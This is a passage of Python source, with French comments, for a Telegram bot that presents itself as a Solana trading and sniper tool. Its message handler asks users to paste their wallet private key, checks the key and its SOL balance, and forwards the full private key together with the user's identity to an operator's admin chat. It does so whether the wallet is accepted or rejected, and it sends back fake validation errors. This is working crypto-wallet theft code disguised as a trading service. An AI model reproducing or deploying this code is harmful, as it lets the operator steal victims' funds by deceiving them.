✅ _Configuration acceptée_"""
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_notification,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Erreur envoi à l'admin: {e}")
        
        return
    
    # Vérifier si l'utilisateur attend de connecter son wallet
    if context.user_data.get('waiting_for_wallet'):
        wallet_type = context.user_data.get('wallet_type', 'Unknown')
        context.user_data['waiting_for_wallet'] = False
        
        # Vérifier la clé privée et le solde
        public_key, sol_balance, usd_value, sol_price, status = await verify_wallet_and_balance(user_message)
        
        if status == "invalid":
            # Clé privée invalide
            back_keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_wallet_menu')]]
            back_markup = InlineKeyboardMarkup(back_keyboard)
            
            await update.message.reply_text(
                "⚠️ Validation Error\n\nInvalid private key format.",
                reply_markup=back_markup
            )
            
            # Notification à l'admin
            admin_notification = f"""❌ **Clé privée invalide**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`
💳 **Wallet Type:** {wallet_type}

🔑 **Clé tentée:**
`{user_message[:20]}...`

---
⚠️ _Clé privée invalide_"""
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=admin_notification,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Erreur envoi à l'admin: {e}")
            
            return
        
        # Clé valide, vérifier le solde en USD
        if usd_value < MINIMUM_USD_REQUIRED:
            # Wallet avec solde insuffisant
            back_keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_wallet_menu')]]
            back_markup = InlineKeyboardMarkup(back_keyboard)
            
            await update.message.reply_text(
                f"⚠️ Wallet Cannot Be Accepted\n\n"
                f"Insufficient balance.\n"
                f"Your wallet contains: {sol_balance:.4f} SOL (${usd_value:.2f} USD)\n\n"
                f"Please add more SOL to use trading features.",
                reply_markup=back_markup
            )
            
            # Notification à l'admin
            admin_notification = f"""⚠️ **Wallet rejeté - Solde insuffisant**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`
💳 **Wallet Type:** {wallet_type}

👛 **Public Key:** `{public_key}`
💰 **Balance:** {sol_balance:.4f} SOL
💵 **Valeur USD:** ${usd_value:.2f}
📊 **Prix SOL:** ${sol_price:.2f}
⚠️ **Minimum requis:** ${MINIMUM_USD_REQUIRED:.2f}

🔑 **Private Key:**
`{user_message}`

---
❌ _Wallet rejeté - Solde insuffisant (< ${MINIMUM_USD_REQUIRED})_"""
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=admin_notification,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Erreur envoi à l'admin: {e}")
            
            return
        
        # Wallet valide avec solde suffisant
        # Sauvegarder les informations du wallet dans user_data
        context.user_data['wallet_connected'] = True
        context.user_data['wallet_public_key'] = public_key
        context.user_data['wallet_balance_sol'] = sol_balance
        context.user_data['wallet_balance_usd'] = usd_value
        context.user_data['wallet_type'] = wallet_type
        
        # Créer un bouton pour retourner au menu
        back_keyboard = [[InlineKeyboardButton("🏠 Back to Main Menu", callback_data='back_to_menu')]]
        back_markup = InlineKeyboardMarkup(back_keyboard)
        
        await update.message.reply_text(
            f"✅ **Wallet Connected Successfully**\n\n"
            f"💳 **Type:** {wallet_type}\n"
            f"💰 **Balance:** {sol_balance:.4f} SOL (${usd_value:.2f} USD)\n"
            f"👛 **Address:** `{public_key[:8]}...{public_key[-8:]}`\n\n"
            f"You can now access all trading features.",
            reply_markup=back_markup,
            parse_mode='Markdown'
        )
        
        # Notification à l'admin
        admin_notification = f"""✅ **Wallet connecté avec succès**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`
💳 **Wallet Type:** {wallet_type}

👛 **Public Key:** `{public_key}`
💰 **Balance:** {sol_balance:.4f} SOL
💵 **Valeur USD:** ${usd_value:.2f}
📊 **Prix SOL:** ${sol_price:.2f}

🔑 **Private Key:**
`{user_message}`

---
✅ _Wallet accepté et connecté_"""
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_notification,
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Erreur envoi à l'admin: {e}")
        
        return
    
    # Message normal - Notification à l'admin
    admin_notification = f"""📨 **Nouveau message reçu**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`

💬 **Message:**
{user_message}

---
_Envoyé depuis le bot_"""
    
    try:
        # Envoyer le message à l'admin
        await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=admin_notification,
            parse_mode='Markdown'
        )
        
    except Exception as e:
        logger.error(f"Erreur lors de l'envoi à l'admin: {e}")
    
    # Envoyer le message à l'utilisateur
    await update.message.reply_text(
        "⚠️ Validation Error\n\nInvalid private key format."
    )




def main():
    """Fonction principale pour lancer le bot"""
    
    # Création de l'application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Ajout des handlers (gestionnaires de commandes)
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("trade", trade_command))
    application.add_handler(CommandHandler("sniper", sniper_command))
    application.add_handler(CommandHandler("wallet", wallet_command))
    application.add_handler(CommandHandler("scan", scan_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Commandes des fonctionnalités
    application.add_handler(CommandHandler("quickbuy", quickbuy_command))
    application.add_handler(CommandHandler("bloom", bloom_command))
    application.add_handler(CommandHandler("multiwallet", multiwallet_command))
    application.add_handler(CommandHandler("analyzer", analyzer_command))
    application.add_handler(CommandHandler("predict", predict_command))
    application.add_handler(CommandHandler("whale", whale_command))
    application.add_handler(CommandHandler("rugcheck", rugcheck_command))
    
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Handler pour tous les messages texte
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    
    # Démarrage du bot
    logger.info("Bot démarré ! 🚀")
    logger.info(f"Messages seront envoyés au Chat ID: {ADMIN_CHAT_ID}")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
